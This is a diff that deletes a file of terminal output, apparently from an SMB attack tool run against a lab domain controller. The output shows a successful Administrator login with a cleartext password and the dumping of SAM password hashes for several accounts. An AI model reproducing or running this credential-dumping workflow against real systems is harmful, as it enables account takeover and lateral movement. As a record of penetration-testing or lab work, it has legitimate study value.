@@ -1,9 +1,0 @@
-[1;34mSMB[0m         10.64.157.224   445    DOMAIN-CONTROLL  [1;34m[*][0m Windows 10 / Server 2019 Build 17763 x64 (name:DOMAIN-CONTROLL) (domain:CONTROLLER.local) ([1;32msigning:True[0m) ([1;36mSMBv1:False[0m)
-[1;34mSMB[0m         10.64.157.224   445    DOMAIN-CONTROLL  [1;32m[+][0m CONTROLLER.local\Administrator:P@$$W0rd [1;33m(Pwn3d!)[0m
-[1;34mSMB[0m         10.64.157.224   445    DOMAIN-CONTROLL  [1;34m[*][0m Dumping SAM hashes
-[1;34mSMB[0m         10.64.157.224   445    DOMAIN-CONTROLL  [1;33mAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2777b7fec870e04dda00cd7260f7bee6:::[0m
-[1;34mSMB[0m         10.64.157.224   445    DOMAIN-CONTROLL  [1;33mGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[0m
-[1;34mSMB[0m         10.64.157.224   445    DOMAIN-CONTROLL  [1;33mDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[0m
-[2;36m[19:28:13][0m[2;36m [0m[1;31mERROR   [0m SAM hashes extraction for user WDAGUtilityAccount       ]8;id=386280;file:///usr/lib/python3/dist-packages/impacket/examples/regsecrets.py\[2mregsecrets.py[0m]8;;\[2m:[0m]8;id=67451;file:///usr/lib/python3/dist-packages/impacket/examples/regsecrets.py#436\[2m436[0m]8;;\
-[2;36m           [0m         failed. The account doesn't have hash information.      [2m                 [0m
-[1;34mSMB[0m         10.64.157.224   445    DOMAIN-CONTROLL  [1;32m[+][0m Added [1;33m3[0m SAM hashes to the database
